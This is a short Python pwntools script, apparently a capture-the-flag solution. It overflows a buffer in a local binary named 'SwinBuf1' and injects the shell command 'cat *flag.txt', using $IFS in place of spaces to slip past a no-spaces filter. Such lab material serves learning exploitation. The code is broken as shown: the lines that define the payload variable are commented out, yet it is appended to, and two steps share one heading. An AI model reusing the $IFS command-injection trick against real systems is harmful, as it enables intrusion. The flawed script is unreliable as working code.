# importing pwn for exploit dev
# Bread @nonsxd
from pwn import *

# not required just helps PWNTools
context(arch = 'i386', os = 'linux')

# testing binaries locally
t = process("./SwinBuf1")

# Step 1: find buffer offset
# cyclic generates patterns for you to find offsets
# n=4 makes the patterns cyclic ever 4 chars
# the first parameter is the amount 
#buf = cyclic(80, n=4)

# Step 2: find buffer offset
# abuse found offset using cyclic find,
# it uses thes the same pattern as cyclic
# so its possible to find an offset of need.
# it returns the count to that offset
#buf = "A" * cyclic_find("kaaa", n=4)
#buf += "cat flag.txt"

# Step 3: no spaces allowed
# The Internal Field Separator (IFS) is a special shell variable.
# The default value is <space><tab><newline>
buf += "cat *flag.txt".replace(" ","$IFS")

#read from terminal 
# readuntil reads until it finds a match
print t.readuntil("name?\n")

#send line (a.k.a attack)
t.sendline(buf)

# prints the output readall reads until EOF 
print t.readall()
